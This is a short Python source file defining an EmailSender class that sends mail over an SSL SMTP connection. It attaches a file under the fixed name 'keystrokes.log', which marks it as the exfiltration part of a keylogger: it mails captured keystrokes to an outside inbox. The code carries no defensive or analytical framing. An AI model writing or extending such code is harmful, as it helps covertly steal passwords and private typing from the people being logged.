import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class EmailSender:
    def __init__(self, smtp_server, port, sender_email, sender_password):
        self.smtp_server = smtp_server
        self.port = port
        self.sender_email = sender_email
        self.sender_password = sender_password

    def send_email(self, recipient_email, subject, message, attachment_path=None):
        try:
            # Set up the email details
            msg = MIMEMultipart()
            msg['From'] = self.sender_email
            msg['To'] = recipient_email
            msg['Subject'] = subject

            # Add the main message
            msg.attach(MIMEText(message, 'plain'))

            # Add the log file as an attachment (optional)
            if attachment_path:
                with open(attachment_path, 'r') as f:
                    attachment = MIMEText(f.read())
                    attachment.add_header('Content-Disposition', 'attachment', filename='keystrokes.log')
                    msg.attach(attachment)

            # Create a secure SSL connection and send the email
            context = ssl.create_default_context()
            with smtplib.SMTP_SSL(self.smtp_server, self.port, context=context) as server:
                server.login(self.sender_email, self.sender_password)
                server.sendmail(self.sender_email, recipient_email, msg.as_string())

            print("Email sent successfully.")
        except Exception as e:
            print(f"Failed to send email: {e}")
